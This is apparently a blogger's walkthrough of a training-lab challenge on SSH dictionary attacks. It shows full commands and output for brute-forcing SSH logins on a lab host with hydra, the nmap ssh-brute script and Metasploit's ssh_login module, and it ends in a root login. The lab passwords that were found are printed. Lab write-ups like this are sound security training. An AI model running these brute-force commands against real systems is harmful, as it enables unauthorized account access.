---
layout: post
title: "SSH Dictionary Attack"
date: "2022-08-22"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Assessment Methodologies
    - Enumeration
---

# SSH Dictionary Attack（SSH 字典攻击）
```
ip a

eth1 inet 192.141.55.2/24

ping 192.141.55.3
```

```
nmap 192.141.55.3

PORT    STATE   SERVICE
22/tcp  open    ssh
```

```
nmap 192.141.55.3 -sV -p 22

PORT    STATE   SERVICE VERSION
22/tcp  open    ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```
hydra -l student -P /usr/share/wordlists/rockyou.txt 192.141.55.3 ssh
```

```
ssh student@192.141.55.3

yes
student@victim-1:~$ ls
student@victim-1:~$ logout
```

```
echo "administrator" > user
nmap 192.141.55.3 -p 22 --script ssh-brute --script-args userdb=/root/user
```

```
msfconsole

use auxiliary/scanner/ssh/ssh_login
show options
set rhosts 192.141.55.3
set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
options
run 
exit -y
```

```
ssh root@192.141.55.3

root@victim-1:~# whoami
root

root@victim-1:~# ls /
```

# SSH Recon: Dictionary Attack（SSH侦察：字典攻击）
## 概述
在这个挑战中，我们将研究对 SSH 服务器的字典攻击。请开始实验并回答以下问题：

**问题**
1. 使用 hydra 查找用户“student”的密码。
2. 使用适当的 Nmap 脚本和密码字典查找用户“administrator”的密码：/usr/share/nmap/nselib/data/passwords.lst
3. 使用带有用户密码字典的 ssh_login Metasploit 模块查找用户“root”的密码：/usr/share/wordlists/metasploit/root_userpass.txt
4. 当天的讯息是什么？（用户登录SSH服务器后打印）。

**指示：**
* 这个实验室是献给你的！此网络上没有其他用户 :)
* 开始实验室后，您将可以访问 Kali 实例的根终端
* 你的 Kali 有一个 IP 地址为 192.XYZ 的接口运行“ip addr”来知道 X 和 Y 的值。
* 目标机器应位于 IP 地址 192.XY3。
* 不要攻击位于 IP 地址 192.XY1 的网关

## 我自己的思路
In this challenge, we will look at the dictionary attacks on SSH server. Please start the lab and answer the following questions:

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
28270: eth0@if28271: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:08 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.8/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
28273: eth1@if28274: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:04:df:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.4.223.2/24 brd 192.4.223.255 scope global eth1
       valid_lft forever preferred_lft forever
```

```
root@attackdefense:~# ping 192.4.223.3 -c 4
PING 192.4.223.3 (192.4.223.3) 56(84) bytes of data.
64 bytes from 192.4.223.3: icmp_seq=1 ttl=64 time=0.110 ms
64 bytes from 192.4.223.3: icmp_seq=2 ttl=64 time=0.040 ms
64 bytes from 192.4.223.3: icmp_seq=3 ttl=64 time=0.041 ms
64 bytes from 192.4.223.3: icmp_seq=4 ttl=64 time=0.033 ms

--- 192.4.223.3 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 73ms
rtt min/avg/max/mdev = 0.033/0.056/0.110/0.031 ms
```

```
root@attackdefense:~# nmap 192.4.223.3
Starting Nmap 7.70 ( https://nmap.org ) at 2022-08-22 14:11 UTC
Nmap scan report for target-1 (192.4.223.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:C0:04:DF:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
```

```
root@attackdefense:~# nmap 192.4.223.3 -p 22 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2022-08-22 14:12 UTC
Nmap scan report for target-1 (192.4.223.3)
Host is up (0.000032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:04:DF:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
```

**Questions**

Find the password of user “student” using hydra.

`login: student   password: friend`

```
root@attackdefense:~# hydra -l student -P /usr/share/wordlists/rockyou.txt 192.4.223.3 ssh
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-22 14:15:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.4.223.3:22/
[STATUS] 180.00 tries/min, 180 tries in 00:01h, 14344223 to do in 1328:11h, 16 active
[22][ssh] host: 192.4.223.3   login: student   password: friend
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-22 14:17:12
```

Find the password of user “administrator” use appropriate Nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst

`administrator:sunshine`

[ssh-brute](https://nmap.org/nsedoc/scripts/ssh-brute.html)

Script Arguments

`userdb` 备用用户名数据库的文件名。默认值：nselib/data/usernames.lst

`passdb` 备用密码数据库的文件名。默认值：nselib/data/passwords.lst

```
root@attackdefense:~# echo "administrator" > user
root@attackdefense:~# nmap -p 22 --script ssh-brute --script-args userdb=user 192.4.223.3
Starting Nmap 7.70 ( https://nmap.org ) at 2022-08-22 14:30 UTC
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: administrator:
NSE: [ssh-brute] Trying username/password pair: administrator:123456
NSE: [ssh-brute] Trying username/password pair: administrator:12345
NSE: [ssh-brute] Trying username/password pair: administrator:123456789
NSE: [ssh-brute] Trying username/password pair: administrator:password
NSE: [ssh-brute] Trying username/password pair: administrator:iloveyou
NSE: [ssh-brute] Trying username/password pair: administrator:princess
NSE: [ssh-brute] Trying username/password pair: administrator:12345678
NSE: [ssh-brute] Trying username/password pair: administrator:1234567
NSE: [ssh-brute] Trying username/password pair: administrator:abc123
NSE: [ssh-brute] Trying username/password pair: administrator:nicole
NSE: [ssh-brute] Trying username/password pair: administrator:daniel
NSE: [ssh-brute] Trying username/password pair: administrator:monkey
NSE: [ssh-brute] Trying username/password pair: administrator:babygirl
NSE: [ssh-brute] Trying username/password pair: administrator:qwerty
NSE: [ssh-brute] Trying username/password pair: administrator:lovely
NSE: [ssh-brute] Trying username/password pair: administrator:654321
NSE: [ssh-brute] Trying username/password pair: administrator:michael
NSE: [ssh-brute] Trying username/password pair: administrator:jessica
NSE: [ssh-brute] Trying username/password pair: administrator:111111
NSE: [ssh-brute] Trying username/password pair: administrator:ashley
NSE: [ssh-brute] Trying username/password pair: administrator:000000
NSE: [ssh-brute] Trying username/password pair: administrator:iloveu
NSE: [ssh-brute] Trying username/password pair: administrator:michelle
NSE: [ssh-brute] Trying username/password pair: administrator:tigger
NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
NSE: [ssh-brute] Trying username/password pair: administrator:chocolate
Nmap scan report for target-1 (192.4.223.3)
Host is up (0.000061s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: 
|     administrator:sunshine - Valid credentials
|_  Statistics: Performed 28 guesses in 6 seconds, average tps: 4.7
MAC Address: 02:42:C0:04:DF:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 6.20 seconds
```

Find the password of user “root” using ssh_login Metasploit module with userpass dictionary: /usr/share/wordlists/metasploit/root_userpass.txt

`root:attack`

```
msf5 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   1  auxiliary/scanner/ssh/ssh_login                          normal  Yes    SSH Login Check Scanner
   2  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  Yes    SSH Public Key Login Scanner


msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.4.223.3
RHOSTS => 192.4.223.3
msf5 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf5 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
USERPASS_FILE => /usr/share/wordlists/metasploit/root_userpass.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
VERBOSE => true
msf5 auxiliary(scanner/ssh/ssh_login) > run

[-] 192.4.223.3:22 - Failed: 'root:'
[!] No active DB -- Credential data will not be saved!
[-] 192.4.223.3:22 - Failed: 'root:!root'
[-] 192.4.223.3:22 - Failed: 'root:Cisco'
[-] 192.4.223.3:22 - Failed: 'root:NeXT'
[-] 192.4.223.3:22 - Failed: 'root:QNX'
[-] 192.4.223.3:22 - Failed: 'root:admin'
[+] 192.4.223.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-121-generic #137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.4.223.2:43601 -> 192.4.223.3:22) at 2022-08-22 14:44:38 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) > exit -y
```

What is the message of the day? (Printed after the user logs in to the SSH server).

`SSH recon dictionary attack lab`

```
root@attackdefense:~# ssh root@192.4.223.3
The authenticity of host '192.4.223.3 (192.4.223.3)' can't be established.
ECDSA key fingerprint is SHA256:dxlBXgBb0Iv5/LmemZ2Eikb5+GLl9CSLf/B854fUeV8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.4.223.3' (ECDSA) to the list of known hosts.
Ubuntu 16.04.5 LTS
root@192.4.223.3's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
SSH recon dictionary attack lab
root@victim-1:~# ls
```

## 解决方案
此实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-527.pdf

[OpenSSH](https://www.openssh.com/)

[hydra](https://www.kali.org/tools/hydra/)

[Nmap Script: ssh-brute](https://nmap.org/nsedoc/scripts/ssh-brute.html)

[SSH Login Check Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_login/)
